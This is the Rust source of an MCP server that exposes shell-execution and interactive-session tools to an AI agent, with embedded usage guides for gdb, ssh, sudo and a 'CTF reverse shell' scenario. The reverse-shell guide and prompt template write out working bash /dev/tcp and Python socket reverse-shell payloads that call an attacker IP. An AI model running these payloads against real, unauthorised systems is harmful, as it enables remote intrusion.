mod audit;

use anyhow::Result;
use dashmap::DashMap;
use long_shell::exec::exec;
use long_shell::shell::Shell;
use rmcp::{
    ErrorData as McpError, RoleServer, ServerHandler, ServiceExt,
    handler::server::wrapper::Parameters, model::*, prompt, prompt_handler, prompt_router,
    schemars, service::RequestContext, tool, tool_handler, tool_router, transport::stdio,
};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;

// ============================================================
// Default Constants
// ============================================================

mod defaults {
    pub const EXEC_TIMEOUT_MS: u64 = 3000;
    pub const OUTPUT_IDLE_MS: u64 = 200;
}

// ============================================================
// Guide Documentation (Resources Content)
// ============================================================

mod guides {
    pub const QUICK_START: &str = r#"
Shell MCP Core Principles: Use `exec` for one-off, non-blocking commands.
For operations that require maintaining state or multi-turn interactions
(python/node REPL, gdb, ssh, mysql, sudo confirmation, reverse shells, etc.),
use the closed loop: `shell_spawn -> shell_send_line -> shell_output -> shell_close`.
After sending each step, you must use `shell_output` to confirm the state before deciding on the next step. Do not send commands in batches.

⚠️ Security Guidelines (MUST read guide://shell/security first): All operations of this tool will be audited and recorded; any operation that may adversely affect the user's local machine (destructive commands, privilege escalation, persistent changes, etc.) must be explained to the user to gain explicit consent before execution.

For detailed scenarios, please read_resource: guide://shell/basics, guide://shell/gdb,
guide://shell/ssh, guide://shell/sudo, guide://shell/reverse_shell,
guide://shell/security
"#;

    pub const SECURITY: &str = r#"
# Security Guidelines (Applicable to all scenarios, highest priority)

This tool runs on the user's actual host machine and has real command execution capabilities; it is NOT a sandbox. Core principle:
**Any operation that may adversely affect the user's local machine must be explained and explicitly approved by the user before execution.**

1. **Audit Trails**: Every `exec` / `shell_spawn` / `shell_send` / `shell_send_line` call is fully recorded (command content, shell type, tag, time). Do not feel overly restricted by the audit, but never assume an operation can be executed "quietly without anyone knowing."

2. **The following types of operations MUST have their intentions explained to the user (what to do, why, and consequences) and require explicit consent before execution**. You cannot assume authorization just because the task description mentions it in passing:
   - **Destructive/Irreversible operations**: `rm -rf`, `dd`, formatting/partitioning disks, dropping databases, overwriting critical files, `git push --force`, deleting large amounts of files/directories.
   - **Privilege escalation/System-level changes**: `sudo`, modifying system configurations (files under /etc), large-scale `chmod`/`chown` modifications, installing/uninstalling system packages, altering firewall rules.
   - **Network exposure/Outbound connections**: Opening listening ports, establishing reverse shells (whether treating the local machine as an attacker or a jump server), exfiltrating local files/keys/environment variables to external addresses.
   - **Persistent changes**: Adding scheduled tasks, startup items, system services, new user accounts.
   - **Process/Resource level disruption**: Killing processes not created by this tool, consuming excessive CPU/memory/disk causing local resource exhaustion.
   - Any command whose outcome is uncertain, difficult to undo, or will significantly alter the current state of the local machine.

3. **Low-risk routine operations can be executed directly without asking every time**, such as: read-only queries (ls/cat/grep/ps/df, etc.), creating/editing files in directories explicitly requested by the user, and repetitive operations already approved by the user (e.g., repeatedly reading the output of the same target in a CTF task). Do not constantly interrupt the user for every harmless command for the sake of "absolute security."

4. **Reverse Shells / SSH Connections to Remote Hosts**: These operations inherently act on remote targets and usually do not directly affect the user's local machine (the local machine merely initiates the connection/listens). Therefore, they can be executed normally according to CTF/debugging scenarios. However, if data returned from the remote side is to be written to the local disk, or if the remote session turns around to initiate actions on the local machine (e.g., tunneling back to the local machine, uploading files to the local machine), you must still follow Rule 2.

5. **When in doubt, ask by default**: If you cannot determine whether a command will significantly affect the local machine state, err on the side of caution—ask the user first instead of assuming "it should be fine" and executing it.
"#;

    pub const BASICS: &str = r#"
# shell_* Basic Usage and Lifecycle

1. shell_spawn(shell, tag): Create a session, customize the tag (e.g., "py1").
2. shell_send_line(input, tag): Send a command and automatically append a newline (Enter); most commonly used. Only returns "sent", without results.
3. shell_send(input, tag): Send content without appending a newline, used for control characters (e.g., \x03 = Ctrl+C).
4. shell_output(tag, idle_ms): Get the output, MUST be called after every send_line; it waits until the output is silent for idle_ms (default 200ms) before returning the incremental stdout/stderr.
5. shell_reset(tag): Force restart the session when stuck/in an infinite loop.
6. shell_close(tag): MUST be called when finished to avoid zombie processes.

Limitations: TUI/GUI programs (vim/nano/htop/less) are strictly prohibited; use cat/head/grep to view files.
For long-running commands (gdb continue, ssh connection, large file downloads): Call shell_output with a larger idle_ms (2000~5000ms). If expected keywords do not appear, poll again instead of waiting indefinitely in a single call.
"#;

    pub const GDB: &str = r#"
# GDB / pwndbg Debugging Scenario

For every step, you must first read the output to confirm the program state (registers/breakpoints hit) before deciding on the next instruction. You must NEVER send multiple commands in batches in advance.

1. shell_spawn(shell="bash", tag="gdb1")
2. shell_send_line(input="gdb ./target_binary", tag="gdb1")
3. shell_output(tag="gdb1", idle_ms=1000) confirm the (gdb)/pwndbg> prompt appears
   (It is normal for pwndbg to have no output for a long time when loading debug info; just poll multiple times)
4. shell_send_line(input="start", tag="gdb1") followed by shell_output to confirm stopping at the entry breakpoint
5. Commands like continue/run have uncertain execution times: if "Breakpoint"/"hit"/"exited" keywords are not seen after shell_output(idle_ms=3000), poll again instead of waiting forever in one call.
6. Upon completion, shell_close(tag="gdb1")

Note: gdb is NOT a valid shell parameter value. You must spawn bash first and then send gdb as a command.
"#;

    pub const SSH: &str = r#"
# SSH Remote Connection Scenario

Intermediate prompts (host fingerprint confirmation, password authentication) may or may not appear. You must observe step-by-step and respond accordingly. Do not assume a fixed number of steps.

1. shell_spawn(shell="bash", tag="ssh1")
2. shell_send_line(input="ssh user@host", tag="ssh1")
3. shell_output(tag="ssh1", idle_ms=1500), determine the next step based on actual content:
   - If "continue connecting (yes/no" appears -> send_line("yes")
   - If "password:" appears -> send_line(password)
   - If the remote prompt appears directly -> key authentication passed
4. Execute remote commands only after confirming successful login (remote prompt/"Last login"); if "Permission denied"/"Connection refused" occurs, terminate the process and report the error.
5. Before finishing, send_line("exit") to return to the local shell, then shell_close(tag="ssh1")

Note: After logging in, all send_line commands are executed on the remote host until an explicit exit.
ssh is also NOT a valid shell parameter value.
"#;

    pub const SUDO: &str = r#"
# sudo Password / y-n Confirmation Scenario

1. shell_spawn(shell="bash", tag="b1")
2. shell_send_line(input="sudo -s apt update", tag="b1")
3. shell_output(tag="b1") observe if "[sudo] password for..." appears
4. shell_send_line(input="password", tag="b1")
5. shell_output(tag="b1", idle_ms=1000) (increase idle_ms if the command is slow)
6. shell_close(tag="b1")
"#;

    pub const REVERSE_SHELL: &str = r#"
# CTF Reverse Shell Scenario

## Typical Workflow: nc listener + target reverse connection

1. Start an interactive listening session locally:
   shell_spawn(shell="bash", tag="listener")
   shell_send_line(input="nc -lvnp 4444", tag="listener")
2. Confirm the listener has started:
   shell_output(tag="listener", idle_ms=500) -> should see "listening on [any] 4444"
3. Trigger the reverse command on the target machine (usually via an acquired web shell / command execution vulnerability), e.g., common payloads (adjust IP/port/interpreter based on actual task):
   - bash: `bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1`
   - python: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<attacker_ip>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`
   This step is usually NOT executed directly via shell_send_line of this tool (the payload runs on the target). Instead, deliver the payload to the channel that triggers the vulnerability; the listener session of this tool only "receives" the reverse connection.
4. After the reverse connection is established, the listener session itself becomes the target machine's shell:
   shell_output(tag="listener", idle_ms=2000) -> observe if the target machine prompt appears
   (e.g., `www-data@target:/$`), confirming shell access.
5. Stabilize the shell (optional, depends on target environment support):
   shell_send_line(input="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", tag="listener")
   shell_send_line(input="export TERM=xterm", tag="listener")
6. Every subsequent command executed inside the target machine is sent via shell_send_line(tag="listener"). You must use shell_output to confirm the result before deciding the next step, identical to the "all commands execute remotely after login" rule in the SSH scenario.
7. Upon task completion (flag acquired / goal achieved):
   shell_close(tag="listener")

## Key Points

- The listener phase uses local nc. `nc` is NOT an "invalid shell value" here—it is run as a command within the bash session, not passed directly to shell_spawn as the shell parameter.
- The execution environment obtained after the reverse shell connects belongs to the target. These operations act on remote targets and usually do not affect the user's local machine; however, if it involves writing remote data back to the local disk, or the remote host initiating actions on the local machine, you must follow guide://shell/security Rule 2: explain first, then execute.
"#;
}

// ============================================================
// Request Parameter Structs
// ============================================================

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct ExecParams {
    /// Command content to execute
    input: String,
    /// Interpreter: can be a common shell/interpreter name (bash/sh/zsh/cmd/powershell/python/node),
    /// or an absolute/relative path to an executable to specify a particular version
    /// (e.g., "/usr/local/bin/python3.11", "C:\\nvm\\v20\\node.exe").
    ///
    /// ⚠️ Interactive programs like debuggers (gdb/lldb/windbg), database clients (mysql/psql/redis-cli),
    /// ssh/telnet/nc, etc., are NOT "interpreters" and should NOT be passed here —
    /// you should first start a session using shell_spawn(shell="bash"),
    /// and then use shell_send_line to send them as normal commands.
    /// See resources: guide://shell/gdb, guide://shell/ssh
    shell: String,
    /// Timeout in milliseconds, default 3000
    timeout_ms: Option<u64>,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct SpawnParams {
    /// Interpreter: can be a common shell/interpreter name (bash/sh/zsh/cmd/powershell/python/node),
    /// or an absolute/relative path to an executable to specify a particular version
    /// (e.g., "/usr/local/bin/python3.11", "C:\\nvm\\v20\\node.exe").
    ///
    /// ⚠️ Interactive programs like debuggers (gdb/lldb/windbg), database clients (mysql/psql/redis-cli),
    /// ssh/telnet/nc, etc., are NOT "interpreters" and should NOT be passed here —
    /// you should first start a session using shell_spawn(shell="bash"),
    /// and then use shell_send_line to send them as normal commands.
    /// See resources: guide://shell/gdb, guide://shell/ssh
    shell: String,
    /// Unique session identifier
    tag: String,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct SendParams {
    /// Content to send
    input: String,
    /// Target session identifier
    tag: String,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct OutputParams {
    /// Target session identifier
    tag: String,
    /// Idle timeout in milliseconds, default 200
    idle_ms: Option<u64>,
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct TagParams {
    /// Target session identifier
    tag: String,
}

// ============================================================
// Unified Response Structs
// ============================================================

#[derive(Debug, Serialize)]
#[serde(tag = "status", rename_all = "lowercase")]
enum ToolResponse<T: Serialize> {
    Ok { data: T },
    Err { message: String },
}

impl<T: Serialize> ToolResponse<T> {
    fn ok(data: T) -> String {
        serde_json::to_string(&Self::Ok { data })
            .unwrap_or_else(|e| format!(r#"{{"status":"err","message":"Serialization failed: {e}"}}"#))
    }
}

impl ToolResponse<()> {
    fn err(message: impl Into<String>) -> String {
        serde_json::to_string(&ToolResponse::<()>::Err {
            message: message.into(),
        })
            .unwrap_or_else(|e| format!(r#"{{"status":"err","message":"Serialization failed: {e}"}}"#))
    }
}

macro_rules! ok {
    ($data:expr) => {
        ToolResponse::ok($data)
    };
}
macro_rules! err {
    ($msg:expr) => {
        ToolResponse::<()>::err($msg)
    };
}
pub(crate) use err;
pub(crate) use ok;

// ============================================================
// Shell parameter blacklist validation (not an enum but blocks obvious misuse)
// ============================================================

const NOT_A_SHELL: &[&str] = &[
    "gdb", "lldb", "windbg",
    "ssh", "telnet", "nc", "ncat",
    "mysql", "psql", "sqlplus", "redis-cli", "mongo", "mongosh",
    "ftp", "sftp",
];

fn non_shell_hint(shell: &str) -> Option<String> {
    let base = shell
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(shell)
        .trim_end_matches(".exe")
        .to_lowercase();

    NOT_A_SHELL.iter().find(|&&name| base == name).map(|name| {
        format!(
            "'{name}' is not a shell/interpreter and cannot be spawned directly as a shell parameter. \
             Please use shell_spawn(shell=\"bash\", tag=...) first, \
             and then use shell_send_line(input=\"{shell} ...\", tag=...) \
             to execute it as a command within the bash session."
        )
    })
}

// ============================================================
// Service Struct
// ============================================================

#[derive(Clone)]
pub struct TerminalMcpService {
    shells: Arc<DashMap<String, Arc<Mutex<Shell>>>>,
}

impl TerminalMcpService {
    pub fn new() -> Self {
        Self {
            shells: Arc::new(DashMap::new()),
        }
    }

    /// Retrieve the Arc reference of the Shell based on the tag; returns the raw error string
    /// (not pre-formatted as JSON response) so that the caller can handle auditing and response
    /// formatting uniformly via `with_audit`.
    fn get_shell(&self, tag: &str) -> std::result::Result<Arc<Mutex<Shell>>, String> {
        self.shells
            .get(tag)
            .map(|entry| entry.value().clone())
            .ok_or_else(|| format!("Session '{tag}' does not exist"))
    }
}

// ============================================================
// MCP Tool Implementations
// ============================================================

#[tool_router]
impl TerminalMcpService {
    // --------------------------------------------------------
    // Single Execution
    // --------------------------------------------------------

    #[tool(
        description = "Execute a command once using the specified shell interpreter (sh/bash/cmd/powershell/python, etc.), process exits after execution"
    )]
    async fn exec(
        &self,
        Parameters(ExecParams {
                       input,
                       shell,
                       timeout_ms,
                   }): Parameters<ExecParams>,
    ) -> String {
        if let Some(hint) = non_shell_hint(&shell) {
            return err!(hint);
        }

        let timeout = Duration::from_millis(timeout_ms.unwrap_or(defaults::EXEC_TIMEOUT_MS));
        let audit_input = input.clone();
        let audit_shell = shell.clone();

        audit::with_audit(
            "exec",
            None,
            Some(audit_shell),
            Some(audit_input),
            || async move {
                exec(input, shell, Some(timeout))
                    .await
                    .map(|res| serde_json::to_value(res).unwrap_or(serde_json::Value::Null))
                    .map_err(|e| e.to_string())
            },
        )
            .await
    }

    // --------------------------------------------------------
    // Interactive Session Management
    // --------------------------------------------------------

    #[tool(description = "List tags and shell paths of all interactive shell sessions")]
    async fn shell_list(&self) -> String {
        audit::with_audit("shell_list", None, None, None, || async {
            let items: Vec<serde_json::Value> = self
                .shells
                .iter()
                .map(|entry| {
                    let tag = entry.key().clone();
                    let shell_path = entry
                        .value()
                        .try_lock()
                        .map(|guard| guard.shell_path.clone())
                        .unwrap_or_default();
                    serde_json::json!({ "tag": tag, "shell_path": shell_path })
                })
                .collect();
            Ok(serde_json::json!(items))
        })
            .await
    }

    #[tool(description = "Check if an interactive shell session with the specified tag exists")]
    async fn shell_exists(&self, Parameters(TagParams { tag }): Parameters<TagParams>) -> String {
        let audit_tag = tag.clone();
        audit::with_audit("shell_exists", Some(audit_tag), None, None, || async move {
            Ok(serde_json::json!(self.shells.contains_key(&tag)))
        })
            .await
    }

    #[tool(description = "Create an interactive shell session with the tag as a unique identifier. \
For complex debugging/remote connection scenarios, it is recommended to first read_resource(guide://shell/gdb or guide://shell/ssh)")]
    async fn shell_spawn(
        &self,
        Parameters(SpawnParams { shell, tag }): Parameters<SpawnParams>,
    ) -> String {
        if let Some(hint) = non_shell_hint(&shell) {
            return err!(hint);
        }

        let audit_tag = tag.clone();
        let audit_shell = shell.clone();

        audit::with_audit(
            "shell_spawn",
            Some(audit_tag),
            Some(audit_shell),
            None,
            || async move {
                match self.shells.entry(tag.clone()) {
                    dashmap::Entry::Occupied(_) => Err(format!("Session '{tag}' already exists")),
                    dashmap::Entry::Vacant(slot) => {
                        let s = Shell::new(&shell)
                            .enable_buffer()
                            .spawn()
                            .await
                            .map_err(|e| e.to_string())?;
                        slot.insert(Arc::new(Mutex::new(s)));
                        Ok(serde_json::json!("created"))
                    }
                }
            },
        )
            .await
    }

    #[tool(description = "Send content to the specified interactive shell (without appending a newline)")]
    async fn shell_send(
        &self,
        Parameters(SendParams { input, tag }): Parameters<SendParams>,
    ) -> String {
        let audit_tag = tag.clone();
        let audit_input = input.clone();

        audit::with_audit(
            "shell_send",
            Some(audit_tag),
            None,
            Some(audit_input),
            || async move {
                let shell = self.get_shell(&tag)?;
                shell
                    .lock()
                    .await
                    .send(&input)
                    .await
                    .map_err(|e| e.to_string())?;
                Ok(serde_json::json!("sent"))
            },
        )
            .await
    }

    #[tool(description = "Send content to the specified interactive shell and append a newline (equivalent to pressing Enter)")]
    async fn shell_send_line(
        &self,
        Parameters(SendParams { input, tag }): Parameters<SendParams>,
    ) -> String {
        let audit_tag = tag.clone();
        let audit_input = input.clone();

        audit::with_audit(
            "shell_send_line",
            Some(audit_tag),
            None,
            Some(audit_input),
            || async move {
                let shell = self.get_shell(&tag)?;
                shell
                    .lock()
                    .await
                    .send_line(&input)
                    .await
                    .map_err(|e| e.to_string())?;
                Ok(serde_json::json!("sent"))
            },
        )
            .await
    }

    #[tool(description = "Get the output of the specified interactive shell (including stdout and stderr)")]
    async fn shell_output(
        &self,
        Parameters(OutputParams { tag, idle_ms }): Parameters<OutputParams>,
    ) -> String {
        let audit_tag = tag.clone();

        audit::with_audit("shell_output", Some(audit_tag), None, None, || async move {
            let shell = self.get_shell(&tag)?;
            let idle = Some(Duration::from_millis(
                idle_ms.unwrap_or(defaults::OUTPUT_IDLE_MS),
            ));

            let mut guard = shell.lock().await;
            let stdout = guard.output(idle).await;
            let stderr = guard.output_error(Some(Duration::ZERO)).await;
            drop(guard);

            Ok(serde_json::json!({ "stdout": stdout, "stderr": stderr }))
        })
            .await
    }

    #[tool(description = "Reset the specified interactive shell session (exit and restart)")]
    async fn shell_reset(&self, Parameters(TagParams { tag }): Parameters<TagParams>) -> String {
        let audit_tag = tag.clone();

        audit::with_audit("shell_reset", Some(audit_tag), None, None, || async move {
            let shell = self.get_shell(&tag)?;
            shell
                .lock()
                .await
                .reset()
                .await
                .map_err(|e| e.to_string())?;
            Ok(serde_json::json!("reset"))
        })
            .await
    }

    #[tool(description = "Close and remove the specified interactive shell session")]
    async fn shell_close(&self, Parameters(TagParams { tag }): Parameters<TagParams>) -> String {
        let audit_tag = tag.clone();

        audit::with_audit("shell_close", Some(audit_tag), None, None, || async move {
            match self.shells.remove(&tag) {
                Some((_, shell)) => {
                    shell.lock().await.close().map_err(|e| e.to_string())?;
                    Ok(serde_json::json!("closed"))
                }
                None => Err(format!("Session '{tag}' does not exist")),
            }
        })
            .await
    }

    #[tool(description = "Close and remove all interactive shell sessions")]
    async fn shell_close_all(&self) -> String {
        audit::with_audit("shell_close_all", None, None, None, || async {
            let tags: Vec<String> = self
                .shells
                .iter()
                .map(|entry| entry.key().clone())
                .collect();

            let mut closed = Vec::new();
            let mut errors = Vec::new();

            for tag in tags {
                if let Some((_, shell)) = self.shells.remove(&tag) {
                    match shell.lock().await.close() {
                        Ok(_) => closed.push(tag),
                        Err(e) => errors.push(format!("{tag}: {e}")),
                    }
                }
            }

            Ok(serde_json::json!({ "closed": closed, "errors": errors }))
        })
            .await
    }
}

// ============================================================
// Prompt Parameter Structs
// ============================================================

#[derive(Debug, Serialize, Deserialize, schemars::JsonSchema)]
pub struct GdbDebugArgs {
    #[schemars(description = "Path to the executable to debug")]
    pub binary_path: String,
    #[schemars(description = "Session tag, defaults to gdb1")]
    pub tag: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, schemars::JsonSchema)]
pub struct SshConnectArgs {
    #[schemars(description = "Target host, IP or domain")]
    pub host: String,
    #[schemars(description = "Login username")]
    pub user: String,
    #[schemars(description = "Session tag, defaults to ssh1")]
    pub tag: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, schemars::JsonSchema)]
pub struct ReverseShellArgs {
    #[schemars(description = "Attacker (local) IP address accessible by the target")]
    pub attacker_ip: String,
    #[schemars(description = "Listening port, defaults to 4444")]
    pub port: Option<u16>,
    #[schemars(description = "Session tag, defaults to listener")]
    pub tag: Option<String>,
}

// ============================================================
// Prompt Implementations (Only one #[prompt_router])
// ============================================================

#[prompt_router]
impl TerminalMcpService {
    #[prompt(name = "shell_usage_guide", description = "Quick reference for core usage principles: when to use exec, when to use interactive sessions")]
    async fn shell_usage_guide(&self) -> Vec<PromptMessage> {
        vec![PromptMessage::new_text(Role::User, guides::QUICK_START)]
    }

    #[prompt(name = "gdb_debug_session", description = "Generate GDB debugging steps for a specified binary")]
    async fn gdb_debug_session(
        &self,
        Parameters(GdbDebugArgs { binary_path, tag }): Parameters<GdbDebugArgs>,
    ) -> Vec<PromptMessage> {
        let tag = tag.unwrap_or_else(|| "gdb1".to_string());
        vec![PromptMessage::new_text(
            Role::User,
            format!(
                "Debug {binary_path} (tag=\"{tag}\"):\n\
                 1. shell_spawn(shell=\"bash\", tag=\"{tag}\")\n\
                 2. shell_send_line(input=\"gdb {binary_path}\", tag=\"{tag}\")\n\
                 3. shell_output(tag=\"{tag}\", idle_ms=1000) confirm the prompt appears\n\
                 4. Confirm with shell_output after every gdb command before proceeding; use a large idle_ms to poll for continue/run\n\
                 5. Once finished, shell_close(tag=\"{tag}\")\n\
                 See guide://shell/gdb for details"
            ),
        )]
    }

    #[prompt(name = "ssh_connect_session", description = "Generate step-by-step SSH connection operations for a target host")]
    async fn ssh_connect_session(
        &self,
        Parameters(SshConnectArgs { host, user, tag }): Parameters<SshConnectArgs>,
    ) -> Vec<PromptMessage> {
        let tag = tag.unwrap_or_else(|| "ssh1".to_string());
        vec![PromptMessage::new_text(
            Role::User,
            format!(
                "Connect to {user}@{host} (tag=\"{tag}\"):\n\
                 1. shell_spawn(shell=\"bash\", tag=\"{tag}\")\n\
                 2. shell_send_line(input=\"ssh {user}@{host}\", tag=\"{tag}\")\n\
                 3. shell_output(tag=\"{tag}\", idle_ms=1500), respond dynamically based on actual output\n\
                    (yes/password/directly entering remote prompt)\n\
                 4. Execute remote commands only after successful login, use exit and then shell_close(tag=\"{tag}\") before finishing\n\
                 See guide://shell/ssh for details"
            ),
        )]
    }

    #[prompt(name = "reverse_shell_session", description = "Generate reverse shell listening operations for CTF scenarios")]
    async fn reverse_shell_session(
        &self,
        Parameters(ReverseShellArgs { attacker_ip, port, tag }): Parameters<ReverseShellArgs>,
    ) -> Vec<PromptMessage> {
        let port = port.unwrap_or(4444);
        let tag = tag.unwrap_or_else(|| "listener".to_string());
        vec![PromptMessage::new_text(
            Role::User,
            format!(
                "Establish a reverse shell listener on {attacker_ip}:{port} (tag=\"{tag}\"):\n\
                 1. shell_spawn(shell=\"bash\", tag=\"{tag}\")\n\
                 2. shell_send_line(input=\"nc -lvnp {port}\", tag=\"{tag}\")\n\
                 3. shell_output(tag=\"{tag}\", idle_ms=500) confirm listening status\n\
                 4. Trigger via target machine vulnerability, similar to:\n\
                    bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\n\
                 5. shell_output(tag=\"{tag}\", idle_ms=2000) confirm the target machine prompt is acquired\n\
                 6. Send subsequent commands via shell_send_line(tag=\"{tag}\"), every step must use \
                    shell_output to confirm the result\n\
                 7. Once finished, shell_close(tag=\"{tag}\")\n\
                 See guide://shell/reverse_shell and guide://shell/security for details"
            ),
        )]
    }
}

// ============================================================
// ServerHandler Implementation
// ============================================================

#[tool_handler]
#[prompt_handler]
impl ServerHandler for TerminalMcpService {
    fn get_info(&self) -> ServerInfo {
        let mut info = ServerInfo::new(
            ServerCapabilities::builder()
                .enable_tools()
                .enable_prompts()
                .enable_resources()
                .build(),
        );
        info.instructions = Some(guides::QUICK_START.to_string());
        info
    }

    async fn list_resources(
        &self,
        _request: Option<PaginatedRequestParams>,
        _context: RequestContext<RoleServer>,
    ) -> std::result::Result<ListResourcesResult, McpError> {
        Ok(ListResourcesResult {
            resources: vec![
                Resource::new("guide://shell/security", "⚠️ Security Guidelines (Must read first)"),
                Resource::new("guide://shell/basics", "shell_* Basic Usage and Lifecycle"),
                Resource::new("guide://shell/gdb", "GDB / pwndbg Debugging Scenario Guide"),
                Resource::new("guide://shell/ssh", "SSH Remote Connection Scenario Guide"),
                Resource::new("guide://shell/sudo", "sudo Password / Confirmation Scenario Guide"),
                Resource::new("guide://shell/reverse_shell", "CTF Reverse Shell Scenario Guide"),
            ],
            next_cursor: None,
            meta: None,
        })
    }

    async fn read_resource(
        &self,
        request: ReadResourceRequestParams,
        _context: RequestContext<RoleServer>,
    ) -> std::result::Result<ReadResourceResult, McpError> {
        let text = match request.uri.as_str() {
            "guide://shell/security" => guides::SECURITY,
            "guide://shell/basics" => guides::BASICS,
            "guide://shell/gdb" => guides::GDB,
            "guide://shell/ssh" => guides::SSH,
            "guide://shell/sudo" => guides::SUDO,
            "guide://shell/reverse_shell" => guides::REVERSE_SHELL,
            _ => {
                return Err(McpError::resource_not_found(
                    "resource_not_found",
                    Some(serde_json::json!({ "uri": request.uri })),
                ));
            }
        };
        Ok(ReadResourceResult::new(vec![ResourceContents::text(
            text,
            &request.uri,
        )]))
    }
}

// ============================================================
// Entry Point
// ============================================================

#[tokio::main]
async fn main() -> Result<()> {
    let _audit_guard = audit::init();

    tracing::info!(target: "audit", event = "server_start", "shell mcp service starting");

    let server = TerminalMcpService::new().serve(stdio()).await?;

    server.waiting().await?;

    tracing::info!(target: "audit", event = "server_stop", "shell mcp service stopped");

    Ok(())
}